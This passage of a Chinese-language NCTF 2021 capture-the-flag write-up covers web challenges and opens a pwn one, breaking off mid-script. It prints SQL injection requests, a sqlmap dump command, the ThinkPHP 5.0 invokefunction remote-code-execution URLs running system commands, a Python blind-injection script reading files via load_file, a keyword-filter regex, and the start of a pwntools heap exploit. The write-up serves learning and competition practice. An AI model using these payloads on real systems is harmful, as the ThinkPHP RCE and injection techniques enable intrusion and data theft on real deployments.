    class DB{
        private static $db = null;
        public function __construct($db_host, $db_user, $db_pass, $db_database){
            static::$db = new mysqli($db_host, $db_user, $db_pass, $db_database);
        }
        static public function buildMySQL($db_host, $db_user, $db_pass, $db_database)
        {
            return new DB($db_host, $db_user, $db_pass, $db_database);
        }
        public static function getInstance(){
            return static::$db;
        }
        public static function connect_error(){
            return static::$db->connect_errno;
        }
        public static function prepare($query, $args){
            if (is_null($query)){
                return;
            }
            if (strpos($query, '%') === false){
                die('%s not included in query!');
                return;
            }
            // get args
            $args = func_get_args();
            array_shift( $args );
            $args_is_array = false;
            if (is_array($args[0]) && count($args) == 1 ) {
                $args = $args[0];
                $args_is_array = true;
            }
            $count_format = substr_count($query, '%s');
            if($count_format !== count($args)){
                die('Wrong number of arguments!');
                return;
            }
            // escape
            foreach ($args as &$value){
                $value = static::$db->real_escape_string($value);
            }
            // prepare
            $query = str_replace("%s", "'%s'", $query);
            $query = vsprintf($query, $args);
            return $query;
        }
        public static function commit($query){
            $res = static::$db->query($query);
            if($res !== false){ 
                    return $res;
                }
                else{
                    die('Error in query.');
            }
        }
    }
    ?>
`config.php`
参考 [Hack.lu CTF 2021 Diamond Safe
一题的一部分](https://www.creastery.com/blog/hack.lu-ctf-2021-web-challenges/)，几乎是原题吧。
由于用了两次 `db::prepare`，而第二次直接拼接了之前的 `$query`，于是可以在第一次的时候 `password` 参数传
`%s`，而后在第二次通过数组传 `name`，从而依次给两个 `%s` 赋值，这样就能实现 sql 注入了。
payload:
    POST /login.php HTTP/1.1
    Host: 129.211.173.64:3080
    Content-Length: 62
    Pragma: no-cache
    Cache-Control: no-cache
    Upgrade-Insecure-Requests: 1
    Origin: http://129.211.173.64:3080
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://129.211.173.64:3080/login.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    password=%s&name[0]=)+or+1%3d1+union+select+1,2,3--+&name[1]=a
得到第一部分flag：`NCTF{3v3ryth1ng_`
提示说另一部分在数据库里。
然后拿 sqlmap 盲注一下 `name[0]` 参数就行。这里是时间盲注，布尔盲注应该也行。要是二分法更快了。
    Payload: password=%s&name[0]=) AND (SELECT 8543 FROM (SELECT(SLEEP(5)))zAnj)-- kVPP&name[1]=a
发现 flag 在 `2021` 数据库下的 `NcTF` 表里，列名为 `fl[@g](https://github.com/g "@g")`。
这个 `fl[@g](https://github.com/g "@g")` 要拿反引号包一下，不然就全是 NULL 了。
    sqlmap -r payload.txt --random-agent -p "name[0]" -D 2021 -T NcTF -C '`fl@g`' --dump -v
得到 `not_fantast1c_:)}`
`NCTF{3v3ryth1ng_not_fantast1c_:)}`
###  摆就完事了
> 题目描述： 啊对对对 太对辣太对辣
>
> target 1:   
>  target 2: 
>
> 备注： if you get no idea about the problem,there is no harm in diffing the
> source code with the official one.
ThinkPHP v5.0.16
`www.zip` 有源码
不过发现直接拿那个经典 RCE 的来打就行。
    http://129.211.173.64:8085/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
    http://129.211.173.64:8085/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat${IFS}/flag
或者找个现成工具（
`nctf{m1saka_wanna_kaibai}`
###  摆就完事了2.0
> 题目描述：  
>  卷起来 不准摆！  
>  target: 
这题也给了 www.zip 源码。
和上面一题源码 diff 一下。
可以发现把那个 RCE 的给修了，而且给了个 `ffllaagg.php`，应该就是要读这个文件了。
那还是接着看他控制器吧。
`application/index/controller/M1sakaM1yuu.php`
    get('username/a');
            $str = implode(',',$username);
            if (waf($str)) {
                return '';
            }
            if($username){
                db('m1saka')->insert(['username' => $username]);
                return '啊对对对';
            }
            else {
                return '说什么我就开摆';//
            }
        }
    }
按理说，访问 
应该就能到这里，但是这里不行。
为了访问到这里，特地去看了 [ThinkPHP 的控制器路由](https://www.kancloud.cn/thinkphp/controller-in-detail/250868)，这个是驼峰命名法。
这道题里 `url_convert` 就设置为 `true`，所以就只能通过 下划线 的方式来访问了。
正如出题人的回复：
>
> 出题的时候特意定义了一个使用驼峰命名法的控制器M1sakaM1yuu，在thinkPHP官方文档中，访问的正确方式应该是index/m1saka_m1yuu/index，中间使用下划线隔开，但是兼容了index/M1sakaM1yuu/index这样的访问方式，这也是在《摆就完事了》中此访问方式能访问到的原因。但是在《摆就完事了2.0》中我加上了官方补丁取消非预期解法，官方补丁不允许路由中存在大写字母，所以会返回404。希望大家以后在开发和代码审计时能注意到这个细节。
于是应该访问 
接下来就是 SQL 注入了。
> 还好出题人给了 sql 文件，可以方便复现。
>  
>  
>     DROP DATABASE IF EXISTS `nctf`;
>     CREATE DATABASE nctf;
>     GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@'127.0.0.1'
> identified by 'nctf';
>     GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@localhost identified
> by 'nctf';
>     GRANT ALL PRIVILEGES on *.* to nctf@'127.0.0.1' WITH GRANT OPTION;
>     GRANT ALL PRIVILEGES on *.* to nctf@localhost WITH GRANT OPTION;
>     flush privileges;
>     use nctf;
>
>     CREATE TABLE `m1saka`  (
>       `id` integer(9) AUTO_INCREMENT,
>       `username` varchar(20) NOT NULL,
>       `password` varchar(50) NULL,
>       `flag_in_ffllaagg.php` varchar(100) NULL,
>       `age` int(5) NULL,
>       PRIMARY KEY (`id`)
>     );
>
>     INSERT INTO `m1saka`
> (`username`,`password`,`flag_in_ffllaagg.php`,`age`) VALUES
> ('m1saka','marry_dingnan','Admin',999);
>  
>
> 这里也提示了 flag 在那个文件里。
这里复现一下，由于目前主办方还没有开源题目，这里就用 DASCTF 的模板自己造一个 Dockerfile 好了。
    FROM dasctfbase/web_php56_apache_mysql
    COPY www /var/www/html
    # 如需操作数据库请将 sql 文件拷贝到 /db.sql
    COPY www/db.sql /db.sql
    # 请声明对外暴露端口
    EXPOSE 80
    docker build -t nctf2021_bai .
    docker run -it -d -p 8000:80 nctf2021_bai:latest
    docker ps
    # xxxxx
    # 进去改 MySQL 配置
    docker exec -it xxxx /bin/bash
首先需要把 MySQL 的 `secure_file_prive` 全局参数设为空（不是 `NULL`）。
设置之前，是读不到其他文件的。
>   1. 限制 mysql 不允许导入 | 导出`--secure_file_prive=null`
>   2. 限制 mysql 的导入 | 导出 只能发生在 `/tmp/` 目录下`--secure_file_priv=/tmp/`
>   3. 不对 mysql 的导入 | 导出做限制`--secure_file_priv=`
>
    echo 'secure_file_priv=' >> /etc/mysql/mysql.conf.d/mysqld.cnf
然后重启容器，这样就能读到文件了。
现在就可以访问
进入到所需的控制器了。
接下来就是 SQL 注入环节。
对比一下官方源码，有个 `EXP` 的过滤给去掉了。
跟着 `db('m1saka')->insert(['username' => $username]);` 看 `insert`
所以只需要传个数组（array），然后第0个元素是 `exp`，第1个元素放注入的内容就完事了。
再来看 waf。
    function waf($str){
        if(preg_match("/system| |\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i", $str)){
            return true;
        }
    }
相当于把写文件的那些都过滤掉了。再考虑到提示了是读文件，于是试着构造时间盲注。
    GET /public/index.php/index/m1saka_m1yuu/index?username[0]=exp&username[1]=if((select(substr(load_file("/var/www/html/ffllaagg.php"),1,1))=0x3c),sleep(3),0)
先在 docker 里的 mysql 试试。
Exp:
这里本地调试，延时就设的短一点了，实际根据需要调整一下就行。（
    # MiaoTony
    import requests
    import time
    import string
    url = r'http://xxxxxx:xxxx/public/index.php/index/m1saka_m1yuu/index'
    s = r'{}<>?. ' + string.ascii_letters + string.digits + r'!@#$%^&*()_-+="\'\\/'
    flag = ''
    for i in range(1, 100):
        for j in s:
            payload = f'select(substr(load_file("/var/www/html/ffllaagg.php"),{i},1))={hex(ord(j))}'
            # print(payload)
            param = {'username[0]': 'exp',
                     'username[1]': f'if(({payload}),sleep(1.5),0)'}
            t = time.time()
            r = requests.get(url, params=param)
            if time.time() - t > 1:
                flag += j
                print(f'[+] {i} {j} {flag}')
                break
    # username[0]=exp&username[1]=if((select(substr(load_file("/var/www/html/ffllaagg.php"),1,1))=0x3c),sleep(3),0)
    # username[0]=exp&username[1]=sleep(if((select(substr(load_file("/var/www/html/ffllaagg.php"),1,1))=0x3c),3,0))
完事。
另外本地还可以把 `config.php` 里的 debug 和 trace 改成 true，来调试看看调用栈。
比如故意在 SQL 里加个 `'`，然后看看。
## Pwn
###  ezheap
> 题目描述:
>  
>  
>     总之就是非常简单
>     nc 129.211.173.64 10002
>  
>
> 附件链接:
>  
>  
>     http://download.kagehutatsu.com/Download/ezheap.zip
>     https://attachment.h4ck.fun:9000/pwn/ezheap/ezheap.zip
>     https://nctf.slight-wind.com/pwn/ezheap/ezheap.zip
>  
简单uaf，直接打free_hook
    from pwn import *
    context.log_level = 'debug'
    # sh = process('./ezheap')
    sh = remote('129.211.173.64',10002)
    def menu(choice):
        sh.recvuntil(">> ")
        sh.sendline(str(choice))
    def add(size, content):
        menu(1)
        sh.recvuntil(': ')
        sh.sendline(str(size))
        sh.recvuntil(': ')
        sh.send(content)
    def edit(idx, content):